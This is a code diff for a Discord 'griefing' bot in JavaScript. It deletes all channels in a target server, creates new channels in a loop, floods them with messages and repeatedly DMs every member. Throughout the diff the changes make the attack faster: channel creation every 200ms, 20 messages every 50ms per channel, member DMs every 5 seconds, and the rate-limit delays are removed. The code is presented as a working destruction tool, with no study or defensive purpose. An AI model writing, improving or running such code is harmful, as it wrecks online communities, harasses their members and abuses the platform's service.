@@ -43,7 +43,7 @@ client.on('messageCreate', async message => {
     }
     
     isGriefing = true;
-    message.channel.send('Starting simultaneous destruction mode...');
+    message.channel.send('Starting ultra-fast destruction mode...');
     
     // Get the target server
     const guild = client.guilds.cache.get(config.targetServerId) || message.guild;
@@ -54,8 +54,8 @@ client.on('messageCreate', async message => {
       return;
     }
     
-    // Start the simultaneous destruction process
-    startSimultaneousDestruction(guild);
+    // Start the ultra-fast destruction process
+    startUltraFastDestruction(guild);
   }
   
   // Command to stop griefing
@@ -70,14 +70,14 @@ client.on('messageCreate', async message => {
   }
 });
 
-async function startSimultaneousDestruction(guild) {
+async function startUltraFastDestruction(guild) {
   try {
     // Start all processes simultaneously
     deleteAllChannelsFast(guild);
     createAndSpamChannels(guild);
     dmAllMembers(guild);
     
-    console.log('Started all destruction processes simultaneously');
+    console.log('Started all ultra-fast destruction processes simultaneously');
   } catch (error) {
     console.error('Error during destruction:', error);
   }
@@ -106,9 +106,9 @@ async function deleteAllChannelsFast(guild) {
 }
 
 async function createAndSpamChannels(guild) {
-  console.log('Starting continuous channel creation and spam...');
+  console.log('Starting ultra-fast channel creation and spam...');
   
-  // Create channels continuously
+  // Create channels continuously at maximum speed
   const createInterval = setInterval(async () => {
     if (!isGriefing) {
       clearInterval(createInterval);
@@ -132,7 +132,7 @@ async function createAndSpamChannels(guild) {
       console.log(`Created channel: ${channel.name}`);
       
       // Start spamming in this new channel immediately
-      startAggressiveSpam(channel);
+      startUltraFastSpam(channel);
       
       // If we have too many channels, remove the oldest ones
       if (createdChannels.length > 500) {
@@ -148,24 +148,24 @@ async function createAndSpamChannels(guild) {
     } catch (error) {
       console.error(`Failed to create channel:`, error);
     }
-  }, 1000); // Create a new channel every second
+  }, 200); // Create a new channel every 200ms (5 channels per second)
 }
 
-function startAggressiveSpam(channel) {
+function startUltraFastSpam(channel) {
   // Create an interval for this specific channel
   const interval = setInterval(async () => {
     if (!isGriefing) return;
     
     try {
-      // Send 10 messages rapidly
-      for (let i = 0; i < 10; i++) {
+      // Send 20 messages rapidly
+      for (let i = 0; i < 20; i++) {
         await channel.send(config.messageContent);
       }
-      console.log(`Sent 10 messages in channel: ${channel.name}`);
+      console.log(`Sent 20 messages in channel: ${channel.name}`);
     } catch (error) {
       console.error(`Failed to spam in channel ${channel.name}:`, error);
     }
-  }, 100); // Send 10 messages every 100ms (10 per second)
+  }, 50); // Send 20 messages every 50ms (40 messages per second)
   
   // Store the interval so we can clear it later
   spamIntervals.set(channel.id, interval);
@@ -185,14 +185,12 @@ async function dmAllMembers(guild) {
       try {
         await member.send(config.messageContent);
         console.log(`DMed ${member.user.tag}`);
-        // Small delay to avoid rate limiting
-        await new Promise(resolve => setTimeout(resolve, 500));
       } catch (error) {
         console.error(`Failed to DM ${member.user.tag}:`, error);
       }
     }
     
-    // After DMing everyone once, start DMing everyone again periodically
+    // After DMing everyone once, start DMing everyone again every 5 seconds
     const dmInterval = setInterval(async () => {
       if (!isGriefing) {
         clearInterval(dmInterval);
@@ -210,8 +208,6 @@ async function dmAllMembers(guild) {
           try {
             await member.send(config.messageContent);
             console.log(`DMed ${member.user.tag}`);
-            // Small delay to avoid rate limiting
-            await new Promise(resolve => setTimeout(resolve, 500));
           } catch (error) {
             console.error(`Failed to DM ${member.user.tag}:`, error);
           }
@@ -219,7 +215,7 @@ async function dmAllMembers(guild) {
       } catch (error) {
         console.error('Error during periodic DM:', error);
       }
-    }, 300000); // DM everyone every 5 minutes
+    }, 5000); // DM everyone every 5 seconds
     
   } catch (error) {
     console.error('Error during initial DM:', error);
